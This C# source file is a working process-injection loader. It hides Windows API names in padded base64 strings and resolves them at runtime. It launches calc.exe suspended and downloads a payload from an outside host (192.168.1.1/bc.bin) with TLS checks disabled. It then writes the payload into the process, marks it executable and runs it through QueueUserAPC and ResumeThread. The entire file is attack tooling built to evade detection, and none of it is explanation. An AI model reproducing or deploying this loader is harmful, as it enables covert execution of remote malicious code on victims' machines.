using System;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Dvilnside
{
    internal class Program
    {

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        //writememprocess
        public delegate bool wr2memprok(
            IntPtr hProcess, 
            IntPtr lpBaseAddress,
            byte[] lpBuffer, 
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);

        //resumethr
        public delegate uint RezThrd(
            IntPtr hThread);

        //virtualprotectEX
        public delegate bool virtuaBrotex(IntPtr hProcess, 
            IntPtr lpAddress, 
            uint dwSize, 
            uint flNewProtect, 
            out uint lpflOldProtect);

        //CreateProcessW
        private delegate bool CretProk(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        //VirtualAllocEx

        public delegate IntPtr VirTllocX(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flAllocationType,
            uint flProtect);

        //QueueUserAPC
        public delegate uint culUsarioABC(
            IntPtr pfnAPC,
            IntPtr hThread,
            uint dwData);


        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetModuleHandleA(
             string lpModuleName
            );

        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetProcAddress(
             IntPtr hModule,
             string lpProcName
            );

        public static string GetSTR(string bld)
        {
            byte[] data = Convert.FromBase64String(bld);
            string strdecc = Encoding.UTF8.GetString(data);
            return strdecc;
        }




        static async Task Main(string[] args)
        {
            var si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);

            var pa = new SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);

            var ta = new SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);

            var pi = new PROCESS_INFORMATION();

            string pker1 = GetSTR("WFhYWFhYWFhYWFhYa2Vybg==").Substring(12, 4);
            string pker2 = GetSTR("WFhYWFhYWFhYWFhYZWwzMg==").Substring(12, 4);

            IntPtr userBaddr = GetModuleHandleA(pker1 + pker2);


            string CPWstr = GetSTR("WFhYWENyZWF0ZVByb2Nlc3NXWFhYWA==").Substring(4,13)+"A"; //4.14
            string VAstr = GetSTR("WFhYWFZpcnR1YWxBbGxvY0V4WFhYWA==").Substring(4, 14); //4.14
            string WPMstr = GetSTR("WFhYWFdyaXRlUHJvY2Vzc01lbW9yeVhYWFg=").Substring(4, 18); //4.18
            string VPExstr = GetSTR("WFhYWFZpcnR1YWxQcm90ZWN0RXhYWFhY").Substring(4,16); //4.16
            string QUAstr = GetSTR("WFhYWFF1ZXVlVXNlckFQQ1hYWFg=").Substring(4,12);//4.12
            string RTHstr = GetSTR("WFhYWFJlc3VtZVRocmVhZFhYWFg=").Substring(4,12); //4.12

            IntPtr funcCPW = GetProcAddress(userBaddr, CPWstr);
            IntPtr funcVA = GetProcAddress(userBaddr, VAstr);
            IntPtr funcWP = GetProcAddress(userBaddr, WPMstr);
            IntPtr funcVPEx = GetProcAddress(userBaddr, VPExstr);
            IntPtr funcQUA = GetProcAddress(userBaddr, QUAstr);
            IntPtr funcRTH = GetProcAddress(userBaddr, RTHstr);

            CretProk callme_CPW = (CretProk) Marshal.GetDelegateForFunctionPointer(funcCPW,typeof(CretProk));//createprocessA

            string PATH = GetSTR("QzpcXFdpbmRvd3NcXFN5c3RlbTMyXFxjYWxjLmV4ZQ==");
            string CurPATH = GetSTR("QzpcXFdpbmRvd3NcXFN5c3RlbTMy");
            var procSTAT = callme_CPW(
                PATH,
                null,
                ref ta,
                ref pa,
                false,
                0x00000004,
                IntPtr.Zero,
                CurPATH,
                ref si,
                out pi); //0x00000004 suspended proc

            if (!procSTAT)
            {
                Console.WriteLine("Creating proc Failed!");
            }

            byte[] bcC_Ode;

            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    bcC_Ode = await client.GetByteArrayAsync("http://192.168.1.1/bc.bin");
                }
            }
            //Console.WriteLine("SC LEngth : "+bcC_Ode.Length);

            VirTllocX callme_VA = (VirTllocX)Marshal.GetDelegateForFunctionPointer(funcVA, typeof(VirTllocX)); //virtuallocEX
            IntPtr AllocatedAddr = callme_VA(
                pi.hProcess,
                IntPtr.Zero,
                bcC_Ode.Length,
                0x00001000 | 0x00002000,
                0x04
                );

            wr2memprok call_WP = (wr2memprok)Marshal.GetDelegateForFunctionPointer(funcWP,typeof(wr2memprok));//WriteProcessMemory
            bool wprocstats = call_WP(
                pi.hProcess,
                AllocatedAddr,
                bcC_Ode,
                bcC_Ode.Length,
                out _
                );
            if ( !wprocstats )
            {
                Console.WriteLine("Writing N mem Failed!");
            }

            virtuaBrotex call_VPEx = (virtuaBrotex)Marshal.GetDelegateForFunctionPointer(funcVPEx,typeof(virtuaBrotex));//VirtualProtectEX

            bool virprtxSTAT = call_VPEx(
                pi.hProcess,
                AllocatedAddr,
                (uint)bcC_Ode.Length,
                0x20,
                out _
                );

            if (!virprtxSTAT)
            {
                Console.WriteLine("Virtprotx Failed!");
            }
            
            culUsarioABC call_QUA = (culUsarioABC)Marshal.GetDelegateForFunctionPointer(funcQUA,typeof(culUsarioABC)); //QueueUserAPC
            call_QUA(
               AllocatedAddr,
                pi.hThread,
                0);

            RezThrd call_RTH = (RezThrd)Marshal.GetDelegateForFunctionPointer(funcRTH,typeof(RezThrd)); //ResumeThread
            call_RTH(pi.hThread);
  
        }
    }
}
